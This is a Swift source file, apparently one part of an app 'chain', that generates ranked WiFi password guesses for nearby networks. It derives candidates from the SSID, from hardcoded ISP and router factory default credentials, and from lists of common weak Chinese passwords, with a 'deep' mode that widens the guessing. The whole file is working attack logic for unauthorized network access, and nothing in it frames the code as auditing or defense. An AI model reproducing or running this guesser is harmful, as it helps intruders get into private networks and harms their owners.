//
//  CredentialCandidates.swift
//  密码候选生成：不抓包、不破解，靠「人们怎么设 WiFi 密码」的统计规律去试
//
//  这是整条链路里命中率最关键的一环：
//    · 运营商光猫/路由器的出厂默认口令
//    · SSID 自身当密码（极常见）
//    · SSID 里的数字片段（房号、手机号后缀、随机后缀）
//    · SSID + 常见后缀（123 / 1234 / 888）
//    · 国内高频弱口令
//
//  每次尝试都要花系统 2–9 秒，所以每台设备只取最可能的若干个，不穷举。
//

import Foundation

enum CredentialCandidates {

    /// 每个 SSID 最多试几个候选密码（时间成本 = 次数 × 单次耗时）
    static let defaultMaxPerSSID = 6
    /// 深度模式下的上限
    static let deepMaxPerSSID = 12

    /// 生成针对某个 SSID 的密码候选（已按优先级排序、已去重、已过滤长度）
    static func guesses(for ssid: String, security: Security, deep: Bool = false) -> [String] {
        guard security != .open else { return [] }

        let trimmed = ssid.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !trimmed.isEmpty else { return [] }
        let lower = trimmed.lowercased()
        let digits = trimmed.filter(\.isNumber)
        /// 去掉分隔符的版本：TP-LINK_5F2A → tplink5f2a
        let compact = String(lower.filter { $0.isLetter || $0.isNumber })

        var out: [String] = []

        // MARK: 1. 运营商 / 厂商出厂默认
        if lower.hasPrefix("chinanet") || lower.contains("telecom") || lower.contains("电信") {
            out += ["nE7jA%5m", "telecomadmin", "admin"]
        }
        if lower.hasPrefix("cmcc") || lower.contains("移动") {
            out += ["aDm8H%MdA", "CMCCAdmin", "admin"]
        }
        if lower.hasPrefix("chinaunicom") || lower.hasPrefix("cu_") || lower.contains("unicom") {
            out += ["CUAdmin", "admin", "12345678"]
        }
        if lower.hasPrefix("tplink") || lower.hasPrefix("mercury") || lower.hasPrefix("fast") {
            out += ["tplink123", "admin", "12345678"]
        }
        if lower.hasPrefix("huawei") || lower.hasPrefix("honor") || lower.hasPrefix("ws5") {
            out += ["huawei123", "admin", "12345678"]
        }
        if lower.hasPrefix("xiaomi") || lower.hasPrefix("redmi") || lower.hasPrefix("mi_") {
            out += ["xiaomi123", "12345678"]
        }
        if lower.hasPrefix("tenda") || lower.hasPrefix("mercury") {
            out += ["tenda123", "12345678"]
        }
        if lower.hasPrefix("asus") || lower.hasPrefix("netgear") || lower.hasPrefix("linksys") {
            out += ["admin", "password"]
        }

        // MARK: 2. SSID 原样（很多人懒得改，直接当密码）
        out.append(trimmed)
        out.append(lower)

        // MARK: 3. 去掉分隔符的 SSID（TP-LINK_5F2A → tplink5f2a）—— 命中率很高
        if compact != lower {
            out.append(compact)
            out.append(compact + "123")
        }

        // MARK: 4. 尾 4 字符派生（5F2A → 5f2a5f2a / 5f2a1234）
        // 只对含数字的 SSID 启用：这类才是「名字+随机后缀」的机器命名
        if trimmed.count >= 4, !digits.isEmpty {
            let tail = String(trimmed.suffix(4)).lowercased()
            out.append(tail + tail)
            out.append(tail + "1234")
            out.append(tail + "12345678")
        }

        // MARK: 5. SSID 里的数字片段（4 位以上才有派生价值）
        if digits.count >= 4 {
            out.append(digits)
            out.append(String(repeating: digits, count: 2))
            if digits.count < 8 {
                out.append(digits + String(repeating: "0", count: 8 - digits.count))
            }
            if digits.count > 8 {
                out.append(String(digits.suffix(8)))
            }
            out.append(String(digits.suffix(4)) + String(digits.suffix(4)))
        } else if !digits.isEmpty {
            out.append(digits)
        }

        // MARK: 5b. SSID + 常见后缀
        out.append(trimmed + "123")
        out.append(lower + "123")
        out.append(lower + "1234")
        out.append(lower + "8888")

        // MARK: 6. 高频弱口令
        out += common

        // MARK: 7. 深度模式再补一批
        if deep {
            out += deepList
            // SSID 前缀 + 年份/生日常见组合
            for suffix in ["2023", "2024", "2025", "2026", "0000", "6666", "9999"] {
                out.append(compact + suffix)
            }
            if !digits.isEmpty {
                out.append(digits + "0000")
                out.append("1" + digits)
            }
        }

        // 去重 + 过滤长度不合法的
        var seen = Set<String>()
        var result: [String] = []
        let limit = deep ? deepMaxPerSSID : defaultMaxPerSSID
        for candidate in out where !candidate.isEmpty {
            guard !seen.contains(candidate) else { continue }
            guard security.validate(candidate) else { continue }
            seen.insert(candidate)
            result.append(candidate)
            if result.count >= limit { break }
        }
        return result
    }

    /// 国内高频弱口令，按实际命中率大致排序
    static let common: [String] = [
        "12345678", "88888888", "11111111", "00000000",
        "66666666", "99999999", "123456789", "1234567890",
        "12341234", "11223344", "5201314520", "woaini1314",
        "abc12345", "abcd1234", "a1234567", "aa123456",
        "qwerty12", "1qaz2wsx", "qazwsx123", "password",
        "passw0rd", "admin123", "root1234", "wifi1234",
        "wlan1234", "guest1234", "13800138000", "13900139000"
    ]

    /// 深度模式追加的弱口令
    static let deepList: [String] = [
        "22222222", "33333333", "44444444", "55555555",
        "77777777", "12121212", "13131313", "147258369",
        "a1b2c3d4", "abcd123456", "abcdefgh", "asdfghjk",
        "zxcvbnm1", "qwertyui", "iloveyou", "520520520",
        "88889999", "10293847", "1q2w3e4r", "q1w2e3r4",
        "woaini520", "1314520a", "wang1234", "zhang123",
        "liu12345", "chen1234", "admin888", "adminadmin",
        "tp123456", "wifi8888", "internet", "123123123",
        "147852369", "741852963", "963852741", "25802580"
    ]
}
